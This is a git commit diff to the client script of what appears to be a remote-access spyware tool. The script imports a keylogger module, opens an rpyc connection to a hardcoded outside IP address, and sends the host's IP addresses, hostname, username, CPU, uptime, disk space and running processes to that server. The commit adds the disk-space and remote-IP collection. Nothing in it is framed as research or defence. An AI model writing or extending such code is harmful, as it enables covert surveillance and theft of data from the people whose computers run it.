23a0a55d48d70cc820a110ecadef51180dce99e9
Kevin.Postal <kevindpostal@gmail.com>
2010-10-13 17:51:38 -0700

    trying to make this drive space work

--- client.py
+++ client.py
@@ -2,6 +2,7 @@ import rpyc
 import platform
 import socket
 import re
+import urllib
 from includes.keylog import *
 from includes.wininfo import *
 
@@ -9,37 +10,46 @@ def main():
     
     conn = connect("67.23.25.86")
     
+	## You will notice message_header and tmp_header
+	## these are just related to output formating
+    message_header = "" * 60  
     tmp_header = "=" * (abs(int(len("NEW USER CONNECTED!")) - 60) / 2 )
     conn.modules.sys.stdout.write("\n" + tmp_header  + "NEW USER CONNECTED!" + tmp_header + "\n\n")
     
     windows = WinInfo()
-    message_header = "=" * 60 
     
-    ##
+    ## Start piping out Connection Information
     title = " **Connection Information** "
-    tmp_header = "=" * (abs(int(len(title)) - 60) / 2 )
+    tmp_header = "*" * (abs(int(len(title)) - 60) / 2 )
     conn.modules.sys.stdout.write(tmp_header  + title + tmp_header)
-    ##
     
-    remoteip= "\nIP Address: %s\n" % (socket.gethostbyname_ex(socket.gethostname())[2][0])
+    remoteip = "\nRemote IP Address: %s\n" % (windows.get_RemoteIP())
+    localip= "Local IP Address: %s\n" % (socket.gethostbyname_ex(socket.gethostname())[2][0])
     hostname = "Hostname: %s\n" % (socket.gethostname()) 
     raw_cpu = "CPU: %s" % (windows.get_Cpu())
     cpu = re.sub("\s+" , " ", raw_cpu) + "\n"
     username = "UserName: %s\n" % (windows.get_display_name())
-    system_uptime = "System Uptime: %s\n" % (windows.systemUptime())
+    system_uptime = "System Uptime: %s Hours\n" % (windows.systemUptime())
+    
+    drive = 'C:'
+    totalsize = 'TotalSize of %s = %f GB\n' % (drive, windows.get_TotalSize(drive))
+    freespace =  'FreeSpace on %s = %f GB\n' % (drive, windows.get_FreeSpace(drive))
+
+    
     
     conn.modules.sys.stdout.write(remoteip)
+    conn.modules.sys.stdout.write(localip)
     conn.modules.sys.stdout.write(hostname)
     conn.modules.sys.stdout.write(username)
     conn.modules.sys.stdout.write(cpu)
-
-
-
     conn.modules.sys.stdout.write(system_uptime)
+    conn.modules.sys.stdout.write(totalsize)
+    conn.modules.sys.stdout.write(freespace)
+	##
 
-    ##
+    ## Process List output
     title = "Process List"
-    tmp_header = "=" * (abs(int(len(title)) - 60) / 2 )
+    tmp_header = "*" * (abs(int(len(title)) - 60) / 2 )
     process_list = windows.processList().__str__()
     conn.modules.sys.stdout.write(tmp_header  + title + tmp_header)
     conn.modules.sys.stdout.write(process_list)
@@ -55,6 +65,9 @@ def main():
     ##
     
     
+    ### Function ###
+    
+
     
 def connect(server):
     return rpyc.classic.connect(server)
